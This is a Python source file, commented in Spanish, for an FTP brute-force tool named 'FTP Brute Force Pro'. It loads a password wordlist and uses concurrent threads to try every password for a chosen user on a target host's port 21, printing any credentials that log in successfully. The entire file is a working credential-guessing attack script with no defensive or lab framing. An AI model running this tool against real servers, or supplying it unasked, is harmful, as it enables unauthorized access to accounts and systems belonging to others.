import ftplib
import argparse
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

def connect_ftp(host, user, password, progress_bar):
    try:
        ftp = ftplib.FTP()
        # Timeout corto para no quedar bloqueados en conexiones lentas
        ftp.connect(host, 21, timeout=5)
        ftp.login(user, password)
        
        # Si llega aquí, las credenciales son correctas
        progress_bar.write(f"\n[!] ¡ÉXITO! Usuario: {user} | Contraseña: {password}")
        ftp.quit()
        return True
    except ftplib.error_perm:
        # Error de autenticación (usuario/pass incorrectos)
        return False
    except Exception:
        # Errores de red o conexión
        return False
    finally:
        progress_bar.update(1)

def main():
    parser = argparse.ArgumentParser(description="FTP Brute Force Pro")
    parser.add_argument("host", help="IP o dominio del servidor FTP")
    parser.add_argument("user", help="Nombre de usuario a atacar")
    parser.add_argument("wordlist", help="Ruta al diccionario de contraseñas")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Hilos concurrentes (default: 10)")
    
    args = parser.parse_args()

    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()

        print(f"[*] Iniciando ataque contra {args.host} para el usuario '{args.user}'")
        print(f"[*] Probando {len(passwords)} contraseñas con {args.threads} hilos...")

        with tqdm(total=len(passwords), desc="Progreso", unit="pwd") as bar:
            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                # Mapeamos la función a la lista de contraseñas
                for pwd in passwords:
                    future = executor.submit(connect_ftp, args.host, args.user, pwd, bar)
                    # Si encuentras una contraseña, podrías detener el pool aquí si lo deseas

    except FileNotFoundError:
        print("[-] Error: El archivo de diccionario no existe.")
    except KeyboardInterrupt:
        print("\n[!] Proceso interrumpido por el usuario.")

if __name__ == "__main__":
    main()
